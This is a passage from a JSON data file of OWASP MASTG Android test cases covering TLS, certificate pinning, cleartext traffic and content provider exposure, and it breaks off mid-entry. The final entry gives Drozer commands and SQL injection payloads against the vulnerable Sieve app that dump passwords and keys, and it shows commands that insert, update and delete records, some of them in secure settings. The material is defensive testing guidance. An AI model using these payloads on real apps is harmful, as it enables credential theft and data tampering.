Certificate Pinning</a></em> for iOS)</li></ul><h2></h2><h2>Observation</h2><p>The output contains the captured network traffic.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any clear text traffic originates from the target app.</p><p><strong>Note</strong>: This can be challenging to determine because traffic can potentially come from any app on the device. See the <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/#overview\" rel=\"noopener noreferrer\" target=\"_blank\">Overview</a> section.</p>",
        "code": "MASTG-TEST-0236",
        "sort_order": 46
    },
    {
        "tags":
        [
            "MASTG-TEST-0282: Unsafe Custom Trust Evaluation"
        ],
        "testcase": "Unsafe Custom Trust Evaluation",
        "details": "<h2>Overview</h2><p>This test evaluates whether an Android app uses <a href=\"https://developer.android.com/reference/javax/net/ssl/X509TrustManager#checkServerTrusted%28java.security.cert.X509Certificate[],%20java.lang.String%29\" rel=\"noopener noreferrer\" target=\"_blank\">checkServerTrusted(...) ↗</a> <a href=\"https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager\" rel=\"noopener noreferrer\" target=\"_blank\">in an unsafe manner ↗</a> as part of a custom TrustManager, causing any connection configured to use that TrustManager to skip certificate validation.</p><p>Such unsafe implementations can allow an attacker to run a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attack</a> with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool for the app and look for all usages of checkServerTrusted(...).</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of locations where checkServerTrusted(...) is used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if checkServerTrusted(...) is implemented in a custom X509TrustManager and does <strong>not</strong> properly validate server certificates.</p><p>This includes cases such as:</p><ul><li>**Using checkServerTrusted(...) which is error prone, when NSC would be enough.</li><li><strong>Trust manager that does nothing:</strong> overriding checkServerTrusted(...) to accept all certificates without any validation, for example by returning immediately without verifying the certificate chain or by always returning true.</li><li><strong>Ignoring errors:</strong> failing to <a href=\"https://support.google.com/faqs/answer/6346016\" rel=\"noopener noreferrer\" target=\"_blank\">throw proper exceptions ↗</a> (e.g. <a href=\"https://developer.android.com/reference/java/security/cert/CertificateException.html\" rel=\"noopener noreferrer\" target=\"_blank\">CertificateException ↗</a> or <a href=\"https://developer.android.com/reference/java/lang/IllegalArgumentException\" rel=\"noopener noreferrer\" target=\"_blank\">IllegalArgumentException ↗</a>) on validation failure, or catching and suppressing them.</li><li><strong>Using <a href=\"https://developer.android.com/reference/java/security/cert/X509Certificate#checkValidity()\" rel=\"noopener noreferrer\" target=\"_blank\">checkValidity() ↗</a> instead of full validation:</strong> relying only on checkValidity() checks whether the certificate is expired or not yet valid, but does <strong>not</strong> verify trust or hostname matching.</li><li><strong>Explicitly loosening trust:</strong> disabling trust checks to accept self-signed or untrusted certificates for convenience during development or testing.</li><li><strong>Misusing <a href=\"https://developer.android.com/reference/javax/net/ssl/X509TrustManager#getAcceptedIssuers()\" rel=\"noopener noreferrer\" target=\"_blank\">getAcceptedIssuers() ↗</a></strong>: Returning null or an empty array without proper handling may effectively disable issuer validation.</li></ul><p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>).</p>",
        "code": "MASTG-TEST-0282",
        "sort_order": 50
    },
    {
        "tags":
        [
            "MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic"
        ],
        "testcase": "Android App Configurations Allowing Cleartext Traffic",
        "details": "<h2>Overview</h2><p>Since Android 9 (API level 28) cleartext HTTP traffic is blocked by default (thanks to the <a href=\"https://mas.owasp.org/MASTG/0x05g-Testing-Network-Communication/#default-configurations\" rel=\"noopener noreferrer\" target=\"_blank\">default Network Security Configuration</a>) but there are multiple ways in which an application can still send it:</p><ul><li><strong>AndroidManifest.xml</strong>: Setting the <a href=\"https://developer.android.com/guide/topics/manifest/application-element#usesCleartextTraffic\" rel=\"noopener noreferrer\" target=\"_blank\">android:usesCleartextTraffic ↗</a> attribute of the &lt;application&gt; tag. Note that this flag is ignored in case the Network Security Configuration is configured.</li><li><strong>Network Security Configuration</strong>: Setting the <a href=\"https://developer.android.com/privacy-and-security/security-config#CleartextTrafficPermitted\" rel=\"noopener noreferrer\" target=\"_blank\">cleartextTrafficPermitted ↗</a> attribute to true on &lt;base-config&gt; or &lt;domain-config&gt; elements.</li></ul><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Obtain the AndroidManifest.xml.</li><li>Obtain the Network Security Configuration.</li><li>Read the value of usesCleartextTraffic from the AndroidManifest.xml.</li><li>Read the value of cleartextTrafficPermitted from the NSC &lt;base-config&gt; element.</li><li>Read the value of cleartextTrafficPermitted from the NSC &lt;domain-config&gt; elements.</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of configurations potentially allowing for cleartext traffic.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if cleartext traffic is permitted. This can happen if any of the following is true:</p><ol><li>The AndroidManifest sets usesCleartextTraffic to true and there's no NSC.</li><li>The NSC sets cleartextTrafficPermitted to true in the &lt;base-config&gt;.</li><li>The NSC sets cleartextTrafficPermitted to true in any &lt;domain-config&gt;.</li></ol><p><strong>Note:</strong> The test doesn't fail if the AndroidManifest sets usesCleartextTraffic to true and there's a NSC, even if it only has an empty &lt;network-security-config&gt; element. For example:</p><pre>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n&lt;/network-security-config&gt;\n</pre>",
        "code": "MASTG-TEST-0235",
        "sort_order": 45
    },
    {
        "tags":
        [
            "MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code"
        ],
        "testcase": "Insecure TLS Protocols Explicitly Allowed in Code",
        "details": "<h2>Overview</h2><p>The Android Network Security Configuration does not provide direct control over specific TLS versions (unlike <a href=\"https://developer.apple.com/documentation/bundleresources/information_property_list/nsexceptionminimumtlsversion\" rel=\"noopener noreferrer\" target=\"_blank\">iOS ↗</a>), and starting with Android 10, <a href=\"https://developer.android.com/privacy-and-security/security-ssl#Updates%20to%20SSL\" rel=\"noopener noreferrer\" target=\"_blank\">TLS v1.3 is enabled by default ↗</a> for all TLS connections.</p><p>There are still several ways to enable insecure versions of TLS, including:</p><h3>Java Sockets</h3><p>An app can obtain an SSLContext using an insecure TLS protocol by calling SSLContext.getInstance(\"TLSv1.1\") and can also enable specific, potentially insecure, protocol versions using the API call javax.net.ssl.SSLSocket.setEnabledProtocols(String[] protocols).</p><h3>Third-party Libraries</h3><p>Some third-party libraries, such as <a href=\"https://square.github.io/okhttp/\" rel=\"noopener noreferrer\" target=\"_blank\">OkHttp ↗</a>, <a href=\"https://square.github.io/retrofit/\" rel=\"noopener noreferrer\" target=\"_blank\">Retrofit ↗</a> or Apache HttpClient, provide custom configurations for TLS protocols. These libraries may allow enabling outdated protocols if not carefully managed:</p><p>For example, using ConnectionSpec.COMPATIBLE_TLS in OkHttp (via okhttp3.ConnectionSpec.Builder.connectionSpecs(...)) can lead to insecure TLS versions, like TLS 1.1, being enabled by default in certain versions. Refer to OkHttp's <a href=\"https://square.github.io/okhttp/security/tls_configuration_history/\" rel=\"noopener noreferrer\" target=\"_blank\">configuration history ↗</a> for details on supported protocols.</p><p>The API call okhttp3.ConnectionSpec.Builder.tlsVersions(...) can also be used to set the enabled protocols (<a href=\"https://square.github.io/okhttp/features/https/\" rel=\"noopener noreferrer\" target=\"_blank\">OkHttp documentation ↗</a>).</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool on the reverse engineered app targeting calls to APIs setting the TLS protocol.</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of all enabled TLS versions in the above mentioned API calls.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#recommended-tls-settings\" rel=\"noopener noreferrer\" target=\"_blank\">insecure TLS version</a> is directly enabled, or if the app enabled any settings allowing the use of outdated TLS versions, such as okhttp3.ConnectionSpec.COMPATIBLE_TLS.</p>",
        "code": "MASTG-TEST-0217",
        "sort_order": 41
    },
    {
        "tags":
        [
            "MASTG-TEST-0233: Hardcoded HTTP URLs"
        ],
        "testcase": "Hardcoded HTTP URLs",
        "details": "<h2>Overview</h2><p>An Android app may have hardcoded HTTP URLs embedded in the app binary, library binaries, or other resources within the APK. These URLs may indicate potential locations where the app communicates with servers over an unencrypted connection.</p><p>Warning</p><p>The presence of HTTP URLs alone does not necessarily mean they are actively used for communication. Their usage may depend on runtime conditions, such as how the URLs are invoked and whether cleartext traffic is allowed in the app's configuration. For example, HTTP requests may fail if cleartext traffic is disabled in the AndroidManifest.xml or restricted by the Network Security Configuration. See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0235\" rel=\"noopener noreferrer\" target=\"_blank\"> Android App Configurations Allowing Cleartext Traffic</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool and look for any http:// URLs.</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of URLs and their locations within the app.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any HTTP URLs are confirmed to be used for communication.</p><p>The presence of hardcoded HTTP URLs does not inherently mean they are used; their actual usage must be validated through careful inspection and testing:</p><ul><li><strong>Reverse Engineering</strong>: Inspect the code locations where the HTTP URLs are referenced. Determine if they are merely stored as constants or actively used to create HTTP requests through networking APIs like HttpURLConnection or OkHttp.</li><li><strong>Static Analysis</strong>: Analyze the app's configuration to identify whether cleartext traffic is permitted. For example, check the AndroidManifest.xml for android:usesCleartextTraffic=\"true\" or inspect the network_security_config. Refer to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0235\" rel=\"noopener noreferrer\" target=\"_blank\"> Android App Configurations Allowing Cleartext Traffic</a></em> for detailed guidance.</li></ul><p>Additionally, complement this static inspection with dynamic testing methods:</p><ul><li><strong>Dynamic Analysis</strong>: Use tools like Frida to hook into networking APIs at runtime. This can reveal how and when the HTTP URLs are used during execution. See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0238\" rel=\"noopener noreferrer\" target=\"_blank\"> Runtime Use of Network APIs Transmitting Cleartext Traffic</a></em> for more details.</li><li><strong>Network Traffic Interception</strong>: Capture and analyze network traffic using tools like Burp Suite, mitmproxy, or Wireshark. This approach confirms whether the app connects to the identified HTTP URLs during real-world usage but depends on the tester's ability to exercise the app's functionality comprehensively. See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0236\" rel=\"noopener noreferrer\" target=\"_blank\"> Cleartext Traffic Observed on the Network</a></em>.</li></ul>",
        "code": "MASTG-TEST-0233",
        "sort_order": 43
    },
    {
        "tags":
        [
            "MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic"
        ],
        "testcase": "Insecure TLS Protocols in Network Traffic",
        "details": "<h2>Overview</h2><p>While static analysis can identify configurations that allow insecure TLS versions, it may not accurately reflect the actual protocol used during live communications. This is because TLS version negotiation occurs between the client (app) and the server at runtime, where they agree on the most secure, mutually supported version.</p><p>By capturing and analyzing real network traffic, you can observe the TLS version actually negotiated and in use. This approach provides an accurate view of the protocol's security, accounting for the server's configuration, which may enforce or limit specific TLS versions.</p><p>In cases where static analysis is either incomplete or infeasible, examining network traffic can reveal instances where insecure TLS versions (e.g., TLS 1.0 or TLS 1.1) are actively in use.</p><h2></h2><h2>Steps</h2><ol><li>Set up <em><a href=\"https://mas.owasp.org/MASTG-TECH-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> Basic Network Monitoring/Sniffing</a></em> (for Android) or <em><a href=\"https://mas.owasp.org/MASTG-TECH-0062\" rel=\"noopener noreferrer\" target=\"_blank\"> Basic Network Monitoring/Sniffing</a></em> (for iOS).</li><li>View the TLS version e.g., using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0081\" rel=\"noopener noreferrer\" target=\"_blank\"> Wireshark</a></em>.</li></ol><h2></h2><h2>Observation</h2><p>The output shows the actually used TLS version.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#recommended-tls-settings\" rel=\"noopener noreferrer\" target=\"_blank\">insecure TLS version</a> is used.</p>",
        "code": "MASTG-TEST-0218",
        "sort_order": 42
    },
    {
        "tags":
        [
            "MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration"
        ],
        "testcase": "Missing Certificate Pinning in Network Security Configuration",
        "details": "<h2>Overview</h2><p>Apps can configure <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/\" rel=\"noopener noreferrer\" target=\"_blank\">certificate pinning using the Network Security Configuration</a>. For each domain, one or multiple digests can be pinned.</p><p>The goal of this test is to check if the app does not implement certificate pinning using the NSC. However, note that the app may be using other pinning methods covered in other tests.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Obtain the AndroidManifest.xml (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>), and check if a networkSecurityConfig is set in the &lt;application&gt; tag.</li><li>Inspect the referenced network security config file, and extract all domains from &lt;domain-config&gt; which have a pin set (&lt;pin-set&gt;).</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of domains which enable certificate pinning.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if no networkSecurityConfig is set, or any relevant domain does not enable certificate pinning.</p>",
        "code": "MASTG-TEST-0242",
        "sort_order": 47
    },
    {
        "tags":
        [
            "MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic"
        ],
        "testcase": "Missing Certificate Pinning in Network Traffic",
        "details": "<h2>Overview</h2><p>There are multiple ways an application can implement certificate pinning, including via the Android Network Security Config, custom TrustManager implementations, third-party libraries, and native code. Since some implementations might be difficult to identify through static analysis, especially when obfuscation or dynamic code loading is involved, this test uses network interception techniques to determine if certificate pinning is enforced at runtime.</p><p>The goal of this test case is to observe whether a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attack</a> can intercept HTTPS traffic from the app. A successful MITM interception indicates that the app is either not using certificate pinning or implementing it incorrectly.</p><p>If the app is properly implementing certificate pinning, the MITM attack should fail because the app rejects certificates issued by an unauthorized CA, even if the CA is trusted by the system.</p><p><em>Testing Tip:</em> While performing the MITM attack, it can be useful to monitor the system logs (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0009\" rel=\"noopener noreferrer\" target=\"_blank\"> Monitoring System Logs</a></em>). If a certificate pinning/validation check fails, an event similar to the following log entry might be visible, indicating that the app detected the MITM attack and did not establish a connection.</p><p>I/X509Util: Failed to validate the certificate chain, error: Pin verification failed</p><h2></h2><h2>Steps</h2><ol><li>Set up an interception proxy, see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Setting Up an Interception Proxy</a></em>.</li><li>Install the application on a device connected to that proxy, and intercept the communication.</li><li>Extract all domains which were intercepted.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of domains for which the interception was successful.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any relevant domain was intercepted.</p>",
        "code": "MASTG-TEST-0244",
        "sort_order": 49
    },
    {
        "tags":
        [
            "MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets"
        ],
        "testcase": "Missing Implementation of Server Hostname Verification with SSLSockets",
        "details": "<h2>Overview</h2><p>This test checks whether an Android app uses <a href=\"https://developer.android.com/reference/javax/net/ssl/SSLSocket\" rel=\"noopener noreferrer\" target=\"_blank\">SSLSocket ↗</a> without a <a href=\"https://developer.android.com/reference/javax/net/ssl/HostnameVerifier\" rel=\"noopener noreferrer\" target=\"_blank\">HostnameVerifier ↗</a>, allowing connections to servers presenting certificates with <strong>wrong or invalid hostnames</strong>.</p><p>By default, SSLSocket <a href=\"https://developer.android.com/privacy-and-security/security-ssl#WarningsSslSocket\" rel=\"noopener noreferrer\" target=\"_blank\">does not perform hostname verification ↗</a>. To enforce it, the app must explicitly invoke <a href=\"https://developer.android.com/reference/javax/net/ssl/HostnameVerifier#verify%28java.lang.String,%20javax.net.ssl.SSLSession%29\" rel=\"noopener noreferrer\" target=\"_blank\">HostnameVerifier.verify() ↗</a> and implement proper checks.</p><p>Such unsafe implementations can allow an attacker to run a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attack</a> with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p><p><strong>Note:</strong> The connection succeeds even if the app has a fully secure Network Security Configuration (NSC) in place because SSLSocket is not affected by it.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool and look for all usages of SSLSocket and HostnameVerifier.</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of locations where SSLSocket and HostnameVerifier are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if the app uses SSLSocket without a HostnameVerifier.</p><p><strong>Note:</strong> If a HostnameVerifier is present, ensure it's not implemented in an unsafe manner. See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0283\" rel=\"noopener noreferrer\" target=\"_blank\"> Incorrect Implementation of Server Hostname Verification</a></em> for guidance.</p>",
        "code": "MASTG-TEST-0234",
        "sort_order": 44
    },
    {
        "tags":
        [
            "MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration"
        ],
        "testcase": "Expired Certificate Pins in the Network Security Configuration",
        "details": "<h2>Overview</h2><p>Apps can configure expiration dates for pinned certificates in the <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/\" rel=\"noopener noreferrer\" target=\"_blank\">Network Security Configuration (NSC)</a> by using the expiration attribute. When a pin expires, the app no longer enforces certificate pinning and instead relies on its configured trust anchors. This means the connection will still succeed if the server presents a valid certificate from a trusted CA (such as a system CA or a custom CA defined in the app's configuration). However, if no trusted certificate is available, the connection will fail.</p><p>If developers assume pinning is still in effect but don't realize it has expired, the app may start trusting CAs it was never intended to.</p><p>Example: A financial app previously pinned to its own private CA but, after expiration, starts trusting publicly trusted CAs, increasing the risk of compromise if a CA is breached.</p><p>The goal of this test is to check if any expiration date is in the past.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Inspect the AndroidManifest.xml, and check if a networkSecurityConfig is set in the &lt;application&gt; tag. If yes, inspect the referenced file, and extract the expiration dates for every domain.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of expiration dates for pinned certificates.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any expiration date is in the past.</p>",
        "code": "MASTG-TEST-0243",
        "sort_order": 48
    },
    {
        "tags":
        [
            "MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms"
        ],
        "testcase": "Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>The first step is to look at AndroidManifest.xml to detect content providers exposed by the app. You can identify content providers by the &lt;provider&gt; element. Complete the following steps:</p><ul><li>Determine whether the value of the export tag (android:exported) is \"true\". Even if it is not, the tag will be set to \"true\" automatically if an &lt;intent-filter&gt; has been defined for the tag. If the content is meant to be accessed only by the app itself, set android:exported to \"false\". If not, set the flag to \"true\" and define proper read/write permissions.</li><li>Determine whether the data is being protected by a permission tag (android:permission). Permission tags limit exposure to other apps.</li><li>Determine whether the android:protectionLevel attribute has the value signature. This setting indicates that the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the &lt;permission&gt; element and set a proper android:protectionLevel. If you use android:permission, other applications must declare corresponding &lt;uses-permission&gt; elements in their manifests to interact with your content provider. You can use the android:grantUriPermissions attribute to grant more specific access to other apps; you can limit access with the &lt;grant-uri-permission&gt; element.</li></ul><p>Inspect the source code to understand how the content provider is meant to be used. Search for the following keywords:</p><ul><li>android.content.ContentProvider</li><li>android.database.Cursor</li><li>android.database.sqlite</li><li>.query</li><li>.update</li><li>.delete</li></ul><p>To avoid SQL injection attacks within the app, use parameterized query methods, such as query, update, and delete. Be sure to properly sanitize all method arguments; for example, the selection argument could lead to SQL injection if it is made up of concatenated user input.</p><p>If you expose a content provider, determine whether parameterized <a href=\"https://developer.android.com/reference/android/content/ContentProvider.html#query%28android.net.Uri%2C%20java.lang.String[]%2C%20java.lang.String%2C%20java.lang.String[]%2C%20java.lang.String%29\" rel=\"noopener noreferrer\" target=\"_blank\">query methods ↗</a> (query, update, and delete) are being used to prevent SQL injection. If so, make sure all their arguments are properly sanitized.</p><p>We will use the vulnerable password manager app <a href=\"https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk\" rel=\"noopener noreferrer\" target=\"_blank\">Sieve ↗</a> as an example of a vulnerable content provider.</p><h3>Inspect the Android Manifest</h3><p>Identify all defined &lt;provider&gt; elements:</p><pre>&lt;provider\n      android:authorities=\"com.mwr.example.sieve.DBContentProvider\"\n      android:exported=\"true\"\n      android:multiprocess=\"true\"\n      android:name=\".DBContentProvider\"&gt;\n    &lt;path-permission\n          android:path=\"/Keys\"\n          android:readPermission=\"com.mwr.example.sieve.READ_KEYS\"\n          android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\"\n     /&gt;\n&lt;/provider&gt;\n&lt;provider\n      android:authorities=\"com.mwr.example.sieve.FileBackupProvider\"\n      android:exported=\"true\"\n      android:multiprocess=\"true\"\n      android:name=\".FileBackupProvider\"\n/&gt;\n</pre><p>As shown in the AndroidManifest.xml above, the application exports two content providers. Note that one path (\"/Keys\") is protected by read and write permissions.</p><h3>Inspect the source code</h3><p>Inspect the query function in the DBContentProvider.java file to determine whether any sensitive information is being leaked:</p><p>Example in Java:</p><pre>public Cursor query(final Uri uri, final String[] array, final String s, final String[] array2, final String s2) {\n    final int match = this.sUriMatcher.match(uri);\n    final SQLiteQueryBuilder sqLiteQueryBuilder = new SQLiteQueryBuilder();\n    if (match &gt;= 100 &amp;&amp; match &lt; 200) {\n        sqLiteQueryBuilder.setTables(\"Passwords\");\n    }\n    else if (match &gt;= 200) {\n        sqLiteQueryBuilder.setTables(\"Key\");\n    }\n    return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, (String)null, (String)null, s2);\n}\n</pre><p>Example in Kotlin:</p><pre>fun query(uri: Uri?, array: Array&lt;String?&gt;?, s: String?, array2: Array&lt;String?&gt;?, s2: String?): Cursor {\n        val match: Int = this.sUriMatcher.match(uri)\n        val sqLiteQueryBuilder = SQLiteQueryBuilder()\n        if (match &gt;= 100 &amp;&amp; match &lt; 200) {\n            sqLiteQueryBuilder.tables = \"Passwords\"\n        } else if (match &gt;= 200) {\n            sqLiteQueryBuilder.tables = \"Key\"\n        }\n        return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, null as String?, null as String?, s2)\n    }\n</pre><p>Here we see that there are actually two paths, \"/Keys\" and \"/Passwords\", and the latter is not being protected in the manifest and is therefore vulnerable.</p><p>When accessing a URI, the query statement returns all passwords and the path Passwords/. We will address this in the \"Dynamic Analysis\" section and show the exact URI that is required.</p><h2></h2><h2>Dynamic Analysis</h2><h3>Testing Content Providers</h3><p>To dynamically analyze an application's content providers, first enumerate the attack surface: pass the app's package name to the Drozer module app.provider.info:</p><pre>dz&gt; run app.provider.info -a com.mwr.example.sieve\n  Package: com.mwr.example.sieve\n  Authority: com.mwr.example.sieve.DBContentProvider\n  Read Permission: null\n  Write Permission: null\n  Content Provider: com.mwr.example.sieve.DBContentProvider\n  Multiprocess Allowed: True\n  Grant Uri Permissions: False\n  Path Permissions:\n  Path: /Keys\n  Type: PATTERN_LITERAL\n  Read Permission: com.mwr.example.sieve.READ_KEYS\n  Write Permission: com.mwr.example.sieve.WRITE_KEYS\n  Authority: com.mwr.example.sieve.FileBackupProvider\n  Read Permission: null\n  Write Permission: null\n  Content Provider: com.mwr.example.sieve.FileBackupProvider\n  Multiprocess Allowed: True\n  Grant Uri Permissions: False\n</pre><p>In this example, two content providers are exported. Both can be accessed without permission, except for the /Keys path in the DBContentProvider. With this information, you can reconstruct part of the content URIs to access the DBContentProvider (the URIs begin with content://).</p><p>To identify content provider URIs within the application, use Drozer's scanner.provider.finduris module. This module guesses paths and determines accessible content URIs in several ways:</p><pre>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nUnable to Query content://com.mwr.example.sieve.DBContentProvider/\n...\nUnable to Query content://com.mwr.example.sieve.DBContentProvider/Keys\nAccessible content URIs:\ncontent://com.mwr.example.sieve.DBContentProvider/Keys/\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords/\n</pre><p>Once you have a list of accessible content providers, try to extract data from each provider with the app.provider.query module:</p><pre>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical\n_id: 1\nservice: Email\nusername: incognitoguy50\npassword: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)\nemail: incognitoguy50@gmail.com\n</pre><p>You can also use Drozer to insert, update, and delete records from a vulnerable content provider:</p><ul><li>Insert record</li></ul><pre>dz&gt; run app.provider.insert content://com.vulnerable.im/messages\n                --string date 1331763850325\n                --string type 0\n                --integer _id 7\n</pre><ul><li>Update record</li></ul><pre>dz&gt; run app.provider.update content://settings/secure\n                --selection \"name=?\"\n                --selection-args assisted_gps_enabled\n                --integer value 0\n</pre><ul><li>Delete record</li></ul><pre>dz&gt; run app.provider.delete content://settings/secure\n                --selection \"name=?\"\n                --selection-args my_setting\n</pre><h3>SQL Injection in Content Providers<a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#sql-injection-in-content-providers\" rel=\"noopener noreferrer\" target=\"_blank\">¶</a></h3><p>The Android platform promotes SQLite databases for storing user data. Because these databases are based on SQL, they may be vulnerable to SQL injection. You can use the Drozer module app.provider.query to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:</p><pre>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"'\"\nunrecognized token: \"' FROM Passwords\" (code 1): , while compiling: SELECT ' FROM Passwords\n\n<br>\ndz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \"'\"\nunrecognized token: \"')\" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')\n</pre><p>If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module app.provider.query is used to list all the database tables:</p><pre>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"*\nFROM SQLITE_MASTER WHERE type='table';--\"\n| type  | name             | tbl_name         | rootpage | sql              |\n| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |\n| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |\n| table | Key              | Key              | 5        | CREATE TABLE ... |\n</pre><p>SQL Injection may also be used to retrieve data from otherwise protected tables:</p><pre>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM Key;--\"\n| Password | pin |\n| thisismypassword | 9876 |\n</pre><p>You can automate these steps with the scanner.provider.injection module, which automatically finds vulnerable content providers within an app:</p><pre>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nInjection in Projection:\n  content://com.mwr.example.sieve.DBContentProvider/Keys/\n  content://com.mwr.example.sieve.DBContentProvider/Passwords\n  content://com.mwr.example.sieve.DBContentProvider/Passwords/\nInjection in 